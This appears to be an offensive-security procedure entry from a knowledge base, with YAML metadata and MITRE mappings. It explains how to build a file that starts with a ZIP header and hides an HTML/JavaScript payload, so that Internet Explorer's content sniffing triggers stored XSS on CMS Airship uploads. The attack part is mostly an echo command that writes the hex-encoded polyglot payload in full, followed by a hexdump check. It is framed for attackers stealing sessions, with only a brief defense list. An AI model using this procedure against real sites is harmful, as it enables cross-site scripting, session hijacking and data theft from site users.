---
id: proc-uuid-001
name: Craft-Malicious-ZIP-HTML-File-for-IE-Sniffing
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:12.835Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
tags:
  - xss
  - file-craft
  - content-sniffing
commands:
  - '[[commands/create-malicious-zip-html]]'
platforms:
  - Linux
  - Web
tools: []
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---

# Craft-Malicious-ZIP-HTML-File-for-IE-Sniffing

## Summary

This procedure crafts a malicious file that begins with a ZIP archive header to trick content-type detection, followed by an HTML payload with JavaScript, exploiting Internet Explorer's sniffing behavior to execute stored XSS when the file is served without proper security headers.

## Description

In the context of CMS Airship, user-uploaded files are served via PublicFiles.php without headers like X-Content-Type-Options: nosniff, allowing IE to interpret ambiguous files as HTML. The crafted file disguises as a ZIP but delivers executable HTML/JS, leading to arbitrary code execution in the victim's browser upon access. This is ideal for authenticated attackers targeting IE users (e.g., IE 11 on Windows 8.1) to steal sessions or data.

## Requirements

1. Access to a Unix-like system (Linux/macOS) for command-line file creation
2. Basic knowledge of hex encoding for ZIP headers
3. Target file upload endpoint that doesn't validate content strictly

## Defense

Defensive measures and detection strategies:

- Set X-Content-Type-Options: nosniff and Content-Disposition: attachment on file serves
- Validate and sanitize uploaded file contents/magic bytes
- Monitor for anomalous file uploads with mixed headers

## Objectives

1. Create a file that evades MIME-type checks
2. Embed JavaScript payload for XSS
3. Ensure execution only in sniffing browsers like IE

## Instructions

### Step 1: Generate ZIP Header and Payload

**Context**: Start with the standard ZIP file signature (PK\x03\x04) and append a minimal directory entry followed by the HTML payload to make IE parse it as HTML.

**Command** ([[commands/create-malicious-zip-html]]):
```bash
echo -ne 'PK\x03\x04\x14\x00\x06\x00\x08\x08\x00\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00malicious.html\x00\x0a\x20\x20\x20\x20\x3c\x68\x74\x6d\x6c\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x3c\x2f\x68\x74\x6d\x6c\x3e\x00\x00' > xss.zip
```

> This command uses echo with -ne flags to output binary data: ZIP header, a fake directory entry, and HTML with an alert script. The file is saved as xss.zip. Expected output: No console errors, file created with ~100 bytes.

### Step 2: Verify File Integrity

**Context**: Ensure the file has the correct header without corrupting the payload.

**Command** ([[commands/hexdump-verify]]):
```bash
hexdump -C xss.zip | head -5
```

> Dumps the first few bytes in hex to confirm PK\x03\x04 start and HTML tags. Expected output: Hex view showing ZIP sig followed by <html><script>alert('XSS');</script></html>.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/create-malicious-zip-html]]
- [[commands/hexdump-verify]]

## Tools Used


## Tags

- [[xss]]
- [[file-craft]]
